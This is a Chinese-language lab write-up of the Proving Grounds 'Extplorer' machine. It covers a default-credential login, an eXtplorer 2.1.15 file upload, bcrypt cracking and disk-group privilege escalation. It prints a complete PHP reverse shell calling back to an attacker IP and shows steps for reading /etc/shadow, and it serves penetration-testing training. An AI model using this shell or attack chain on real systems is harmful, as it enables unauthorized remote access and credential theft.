---
title: Proving Grounds Extplorer-ClamAV
date: 2025-6-10 20:00:00
tags: 红队
categories: 红队打靶-Linux
---

# 信息收集

## nmap

![image-20250610113426176](./Extplorer/image-20250610113426176.png)

## 80端口

![image-20250611145028866](./Extplorer/image-20250611145028866.png)

扫到个filemanager目录，是一个登录页面，在网上可以查到默认密码为`admin:admin`，使用默认账号密码可以登录

![image-20250611145157485](./Extplorer/image-20250611145157485.png)

![image-20250611145935379](./Extplorer/image-20250611145935379.png)

changelog中保存的是更新日志，当前版本应该是2.1.15

![image-20250611152652902](./Extplorer/image-20250611152652902.png)

并且通过下面的xml文件中也可以看到版本是2.1.15

![image-20250611155039499](./Extplorer/image-20250611155039499.png)

该版本存在任意文件上传漏洞

![image-20250611155116863](./Extplorer/image-20250611155116863.png)

# 任意文件上传-getshell

可以上传一个php后门，然后访问后门页面，就可以成功反弹shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.198';
$port = 80;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

上传过程中没有什么限制，不需要抓包改请求包等等，直接上传即可

![image-20250611161112402](./Extplorer/image-20250611161112402.png)

home下还有个用户dora，该用户有local.txt，所以要尝试先切换到该用户

在config目录下找到该用户的密码，识别之后是`bcrypt`加密

![image-20250611163651894](./Extplorer/image-20250611163651894.png)

![image-20250611163656327](./Extplorer/image-20250611163656327.png)

hashcat -m 指定加密类型后可以成功破解

```
dora:doraemon
```

![image-20250611165137299](./Extplorer/image-20250611165137299.png)

![image-20250611165412602](./Extplorer/image-20250611165412602.png)

# 提权

切换到dora用户之后，该用户属于磁盘组

![image-20250611165456428](./Extplorer/image-20250611165456428.png)

[磁盘组权限提升 | VK9 Security --- Disk group privilege escalation | VK9 Security](./https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989---------------------------------------)

可以借助这篇文章来进行权限提升，可以读取到proof.txt

![image-20250611171826615](./Extplorer/image-20250611171826615.png)

也可以读取`/etc/shadow`,然后破解`root`用户的密码

![image-20250611172357454](./Extplorer/image-20250611172357454.png)

![image-20250611172350957](./Extplorer/image-20250611172350957.png)

```
root:explorer
```

![image-20250611172418762](./Extplorer/image-20250611172418762.png)